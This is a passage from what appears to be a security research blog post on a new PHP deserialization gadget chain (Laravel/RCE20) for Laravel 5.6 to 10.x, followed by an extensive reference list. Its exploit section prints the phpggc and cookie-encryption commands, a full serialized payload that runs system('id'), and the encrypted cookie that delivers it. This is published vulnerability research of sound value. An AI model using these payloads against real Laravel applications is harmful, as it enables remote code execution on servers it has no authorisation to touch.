  use Illuminate\Contracts\Auth\Guard;
  use Illuminate\Support\Traits\Macroable;
  use Illuminate\Contracts\Auth\UserProvider;
  
  class RequestGuard implements Guard
  {
  use GuardHelpers, Macroable;
  
  ...
  
  /**
  * Get the currently authenticated user.
  *
  * @return \Illuminate\Contracts\Auth\Authenticatable|null
  */
  public function user()
  {
  // If we've already retrieved the user for the current request we can just
  // return it back immediately. We do not want to fetch the user data on
  // every call to this method because that would be tremendously slow.
  if (! is_null($this->user)) {
  return $this->user;
  }
  
  return $this->user = call_user_func(
  $this->callback, $this->request, $this->getProvider()
  );
  }
  
  ...
  }
  

File: src/Illuminate/Auth/GuardHelpers.php  
Class: `GuardHelpers`  
Function: `getProvider()`
  
  
  <?php
  
  namespace Illuminate\Auth;
  
  use Illuminate\Contracts\Auth\UserProvider;
  use Illuminate\Contracts\Auth\Authenticatable as AuthenticatableContract;
  
  /**
  * These methods are typically the same across all guards.
  */
  trait GuardHelpers
  {
  
  ...
  
  /**
  * Get the user provider used by the guard.
  *
  * @return \Illuminate\Contracts\Auth\UserProvider
  */
  public function getProvider()
  {
  return $this->provider;
  }
  
  ...
  
  }
  

Once we'd found this object, all we had to do was implement the new gadget chain in PHPGGC.

### Our gadget chain

A pull request was made to add the new gadget chain to PHPGGC.

  * [Laravel: Added RCE/19, which targets Laravel versions 5.6 <= 10.x](https://github.com/ambionics/phpggc/pull/172)
  * [Update gadgets chain class name to RCE20 in order to avoid conflict](https://github.com/ambionics/phpggc/pull/174)

To use this new chain, simply run the following command:
  
  
  ./phpggc -f -b Laravel/RCE20 system id
  YToyOntpOjc7Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6Mzp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjM2OiJJbGx1bWluYXRlXFJvdXRpbmdcUmVzb3VyY2VSZWdpc3RyYXIiOjE6e3M6OToiACoAcm91dGVyIjtOO31zOjc6IgAqAG5hbWUiO086Mzg6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxSdWxlc1xSZXF1aXJlZElmIjoxOntzOjk6ImNvbmRpdGlvbiI7YToyOntpOjA7TzoyODoiSWxsdW1pbmF0ZVxBdXRoXFJlcXVlc3RHdWFyZCI6Mzp7czoxMToiACoAY2FsbGJhY2siO3M6Njoic3lzdGVtIjtzOjEwOiIAKgByZXF1ZXN0IjtzOjI6ImlkIjtzOjExOiIAKgBwcm92aWRlciI7aToxO31pOjE7czo0OiJ1c2VyIjt9fXM6MTM6***REDACTED-SUSPECT-TOKEN***Then convert the output into an encrypted cookie using [Rémi Matasse](https://twitter.com/_remsio_)'s tool [laravel_cookie_killer](https://github.com/synacktiv/laravel_cookie_killer):
  
  
  python3 laravel_cookie_killer.py -e -k QRvT6RU370IPjdeB9OWDATD/2nFs1zpPlLtL8pb9Hvk= -v YToyOntpOjc7Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6Mzp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjM2OiJJbGx1bWluYXRlXFJvdXRpbmdcUmVzb3VyY2VSZWdpc3RyYXIiOjE6e3M6OToiACoAcm91dGVyIjtOO31zOjc6IgAqAG5hbWUiO086Mzg6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxSdWxlc1xSZXF1aXJlZElmIjoxOntzOjk6ImNvbmRpdGlvbiI7YToyOntpOjA7TzoyODoiSWxsdW1pbmF0ZVxBdXRoXFJlcXVlc3RHdWFyZCI6Mzp7czoxMToiACoAY2FsbGJhY2siO3M6Njoic3lzdGVtIjtzOjEwOiIAKgByZXF1ZXN0IjtzOjI6ImlkIjtzOjExOiIAKgBwcm92aWRlciI7aToxO31pOjE7czo0OiJ1c2VyIjt9fXM6MTM6***REDACTED-SUSPECT-TOKEN***  eyJpdiI6ICJPcjN4T2NuWGhnZ0poRHhJWFZWNEhRPT0iLCAidmFsdWUiOiAiZFhBT3ByWTZCTlplQzdrTStKV1VydU9tZy9qSkVBeis3dkZmakZUOEhuOVh1c3I2V1hZMnpQR0p1K1E2L01idlplbEF4SnJzYTRsdEt2ZWFnN0haSm1WeGRRUkhaUHk1SEVhdGp5M0NCMjRnTXdmYTUxQXZiVTlFMEtjczlkR2x5ZWJrY3pvZnZoeEZBYUlIak5tOWg4UHNPMXlvUkZtMHUyYi9YV2RnVEZ6MUc1SURKTVdJcjVvR2RrWnBOcUZ1WVNEWVFMWkF0c0hBRnF4K3FzUHlBbGVWRytNUDFmV3BBUkNMYnlKZHRsSndxaThCcWVVbElsZGwzTmNsOExwNjdCY2R1UXV0WTBLeUZSVEZOdytRR1NzMWwyOHc3VjRpbjNiWkNRckZUdnN0ZTZoa1BITTBUYmVDMWttcnZhM1cxZEZMU1pOSk1HK093WmtJMEtZb2NnbGl5VFZjQXJpQ3VJSVFDMnVja0hxT2VxdkQ1RGJTTmFwNUlhclN6NnR2NTBlRDg3Z25XTWcrSWM3STA0aFowbkpHakJCRzgzVHFZckVYVWxUYW8yZzlFWUcxbTBjZGU3RTE4L2pzWlBZZ3JPRzRzbGVxQUtSRWJJZmFGNFlRVG5ZK2t2NS9Yd0w2VGJUdk43MGxCREhNNHgweEZkWmJ0cERPcmhKVlJFTnJlbnFKSkw1ZTE0anVPYmpzbHJBN05CbmhGMm5idUpTcU1HdFkzcStTYmM5a0pPS1p2N2lNR2pReFlMaGtWcnQ2Zm9pYXFGMFA4ZjI4NEF1QnVrQWxPNVM0VXN6bUhlSU5pSlVMU3hYdHo1TkwrT29UcVpYb3RsNWI0czJMYzRpUUFQYndmRVM4eDRkSERhV0QyZlJ4UzJnR0ovQnp6ZmdQUldZNUY0Q0pKcGovaFBOM0tQZlJtOEFZY0pWWnJjYVZnRVdvYVNuak9aN0VuMm5OMUhKL2FwMXJ6VnlHcHZOQk0xUnh0eW1xRmhnPSIsICJtYWMiOiAiMWEwNTY0YjdiMGJiMzJkMzNhNWQxNzk2ZDg3ZGEzNmU1NTU3ZTI2Nzk5NTIxNjk4OWVlN2E4MzM1ZGU3ZTU5ZiIsICJ0YWciOiAiIn0=
  

Insert the value obtained into your cookie and you'll be able to get code execution on your target.

![alt-text](resources/2024-02-06_laravel-gadget-chain/Captures/c10.png)

After compromising our target, we tried to identify which version of Laravel our gadget chain was valid for and have identified that it was valid since version `v5.6.30`.

## Going a bit further

To go a little further on the subject of exploiting deserialization vulnerabilities in PHP, we invite you to take a look at exploiting such vulnerabilities using the `phar://` wrapper. However, the following information should now be taken into account. A security improvement in PHP 8.0 makes the `Phar` stream wrapper (`phar://`) no longer automatically call `unserialize()` on stream wrapper operations, such as `file_exists('phar://file.txt')`. Calling functions that accepted stream wrappers (`fopen`, `file_exists`, `etc`) with a `phar://` URI used to immediately triggered the `unserialize()` function, which changed in PHP 8.0. Only explicit calls to `Phar::getMetadata` and `PharFile::getMetadata` attempt to unserialize the `Phar` metadata.

## References

Exploiting deserialization vulnerabilities in PHP is not a new thing and has therefore already been documented. The aim of this article was to present two tricks for identifying new gadget chains or improving existing ones, while condensing in the first part all the information needed to understand the mechanisms involved.

Over the past 20 years, many people have been involved in exploiting this type of vulnerability, and some have made the effort to document their work. The following references are by no means exhaustive and therefore do not represent all those who have worked on the subject.

### Documentation

  * On [www.php.net](https://www.php.net/):

  * [serialize](https://www.php.net/manual/en/function.serialize.php)
  * [unserialize](https://www.php.net/manual/en/function.unserialize.php)
  * [Serializable::unserialize](https://www.php.net/manual/en/serializable.unserialize.php)
  * [The Serializable interface](https://www.php.net/manual/en/class.serializable.php)
  * [Constructors and Destructors: __construct()](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
  * [Constructors and Destructors: __destruct()](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
  * [Method overloading: __call()](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
  * [Method overloading: __callStatic()](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
  * [Property overloading: __get()](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
  * [Property overloading: __set()](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
  * [Property overloading: __isset()](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
  * [Property overloading: __unset()](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
  * [__sleep()](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
  * [__wakeup()](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
  * [__serialize()](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
  * [__unserialize()](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
  * [__toString()](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
  * [__set_state()](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
  * [Object Cloning: __clone()](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
  * [__debugInfo()](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)
  * On [www.phpinternalsbook.com](https://www.phpinternalsbook.com/)

  * [Serialization](https://www.phpinternalsbook.com/php5/classes_objects/serialization.html)
  * On [php.watch](https://php.watch/):

  * [PHP 8.0: phar:// stream wrapper no longer unserializes meta data automatically](https://php.watch/versions/8.0/phar-stream-wrapper-unserialize)

### Lab

  * [Laravel](https://laravel.com/)

  * [v5.7.15](https://github.com/laravel/laravel/archive/refs/tags/v5.7.15.zip)
  * [sprintcube](https://github.com/sprintcube)

  * [docker-compose-lamp](https://github.com/sprintcube/docker-compose-lamp)

### unserialize() exploitation

#### Memory corruptions

  * [Shocking News in PHP Exploitation](https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf), by Stefan Esser in November 2009.

  * [Utilizing Code Reuse/ROP in PHP Application Exploits](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf), by Stefan Esser in July 2010.

  * [video](https://www.youtube.com/watch?v=c0ZCe311YW8)
  * [Exploiting memory corruption bugs in PHP (CVE-2014-8142 and CVE-2015-0231) Part 1: Local Exploitation](https://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in.html), by Tim Michaud in February 2015.

  * [Exploiting memory corruption bugs in PHP (CVE-2014-8142 and CVE-2015-0231) Part 2: Remote Exploitation](https://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in_23.html), by Tim Michaud in February 2015.

  * [Exploiting memory corruption bugs in PHP Part 3: Popping Remote Shells](https://www.inulledmyself.com/2015/05/exploiting-memory-corruption-bugs-in.html), by May Tim Michaud in 2015.

  * [Remote code execution via PHP](https://notsosecure.com/remote-code-execution-php-unserialize), by Rahul Sasi in September 2015.

  * [Exploiting PHP-7 unserialize](https://blog.checkpoint.com/wp-content/uploads/2016/08/Exploiting-PHP-7-unserialize-Report-160829.pdf), by Yannay Livneh in August 2016.

  * [video](https://www.youtube.com/watch?v=_Zj0B4D4TYc)

#### Gadget chains

  * [Shocking News in PHP Exploitation](https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf), by Stefan Esser in November 2009.

  * [Analysis of the Joomla PHP Object Injection Vulnerability](https://karmainsecurity.com/analysis-of-the-joomla-php-object-injection-vulnerability), by Egidio Romano in February 2013.

  * [presentation](https://fr.slideshare.net/_EgiX/joomladay2013)
  * [video](https://www.youtube.com/watch?v=oNN8qa24Qns)
  * [PHP Object Injection Revisited](https://prezi.com/5hif_vurb56p/php-object-injection-revisited/?webgl=0), by Arseniy Reutov in May 2013.

  * [video](https://www.youtube.com/watch?v=op1vTq9ZEvo)
  * [Remote Code Execution exploit in WordPress 3.5.1](https://tom.vg/2013/12/wordpress-rce-exploit/), by Tom Van Goethem December 2013.

  * [presentation](https://tom.vg/talks/RemoteCodeExecutionInWordPress-OWASPBeNeLux-Tom_Van_Goethem.pdf)
  * [Exploiting CVE-2014-1691: Horde Framework PHP Object Injection](https://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection), by Egidio Romano in February 2014.

  * [PHP Object Injection Demystified](https://fr.slideshare.net/_EgiX/php-object-injection-demystified), by Egidio Romano in March 2015.

  * [PHP unserialization vulnerabilities: What are we missing?](https://fr.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing), by Sam Thomas in August 2015.

  * [video](https://www.youtube.com/watch?v=PqsudKzs79c)
  * [PHP generic gadget chains: exploiting unserialize in unknown environments](https://www.ambionics.io/blog/php-generic-gadget-chains), by Charles Fol in July 2017.

  * [tool](https://github.com/ambionics/phpggc)
  * [It's A PHP Unserialization Vulnerability Jim, But Not As We Know It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf), by Sam Thomas in August 2018.

  * [video](https://www.youtube.com/watch?v=GePBmsNJw6Y)
  * [Exploiting Drupal8's REST RCE](https://www.ambionics.io/blog/drupal8-rce), by Charles Fol in February 2019.

  * [Typo3's core, file deletion Gadget Chain](https://therealcoiffeur.com/c11101.html), by Dade Murphy in January 2022.

  * [Dompdf multiple file deletion Gadget Chains](https://therealcoiffeur.com/c11110.html), by Dade Murphy in January 2022.

  * [Unserializable, but unreachable a vBulletin 0-day](https://www.rump.beer/2022/slides/Unserializable_but_unreachable.pdf), by Charles Fol in September 2022.

  * [Demystifying PHP Object Injection](https://secops.group/demystifying-php-object-injection/) by Aditya Singh in September 2022.

  * [FUGIO: Automatic Exploit Generation for PHP Object Injection Vulnerabilities](https://www.usenix.org/system/files/sec22summer_park-sunnyeo.pdf), by Sunnyeo Park and Daejun Kim in August 2022.

  * [video](https://www.youtube.com/watch?v=Rb8XTm-3ep0)
  * [File include chain on Laravel framework](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it), by Remi Matasse in October 2022.

  * [vBulletin <= 5.6.9: Pre-authentication Remote Code Execution](https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable), by Charles Fol in January 2023.

  * [Snappy, file deletion Gadget Chain](https://therealcoiffeur.com/c101110.html), by Dade Murphy in June 2023.

  * [PHPWord, file deletion Gadget Chain](https://therealcoiffeur.com/c101111.html), by Dade Murphy in June 2023.
  * [CodeIgniter4, file deletion Gadget Chain](https://therealcoiffeur.com/c110000.html), by Dade Murphy in July 2023.

  * [Finding a POP chain on a common Symfony bundle: part 1](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1), by Remi Matasse in September 2023.

  * [Finding a POP chain on a common Symfony bundle: part 2](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2), by Remi Matasse in October 2023.

  * [Gadgets chain in Wordpress](https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/), by Maxime Rinaudo in November 2023.

  * [Gadgets chain in Laravel](https://fenrisk.com/publications/blogpost/2023/11/30/gadgets-chain-in-laravel/), by Maxime Rinaudo in November 2023.

#### Application logic (code flow)

  * [Drupal 7.x services module unserialize() to RCE](https://www.ambionics.io/blog/drupal-services-module-rce), by Charles Fol in March 2017.

  * [PHPFusion v9.03.60, PHP Object Injection to SQL injection (pre-auth)](https://therealcoiffeur.com/c111.html), by Dade Murphy in May 2020.

  * [Zabbix >= v5.2.0, PHP Object Injection (pre-auth)](https://therealcoiffeur.com/c10000.html), by Dade Murphy in March 2020.

  * [PHPBoost CMS 5.2, PHP Object Injection (pre-auth)](https://therealcoiffeur.com/c10111.html), by Dade Murphy in February 2021.

  * [Pre-Auth RCE in Moodle Part I - PHP Object Injection in Shibboleth Module](https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/), by Robin Peraglie & Johannes Moritz in July 2021.

  * [Pre-Auth RCE in Moodle Part II - Session Hijack in Moodle's Shibboleth](https://haxolot.com/posts/2022/moodle_pre_auth_shibboleth_rce_part2/), by Robin Peraglie & Johannes Moritz in January 2021.

  * [vBulletin, PHP Object Injection (pre-auth)](https://therealcoiffeur.com/b14.html), by Dade Murphy in September 2022.

  * [AfterLogic, PHP Object Injection to Remote Code Execution (pre-auth)](https://therealcoiffeur.com/c110001.html), by Dade Murphy in July 2023.

### Tools

  * [PHPGGC](https://github.com/ambionics/phpggc), by Charles Fol.

  * [PHP Unserialize Check (Burp Suite extension)](https://github.com/securifybv/PHPUnserializeCheck), by Yorick Koster.

  * [PHP Object Injection Slinger (Burp Suite extension)](https://github.com/ricardojba/poi-slinger), by Ricardo Almeida.

* * *

If you would like to learn more about our security audits and explore how we can help you, [get in touch with us](https://content.quarkslab.com/talk-to-our-experts-blog)!
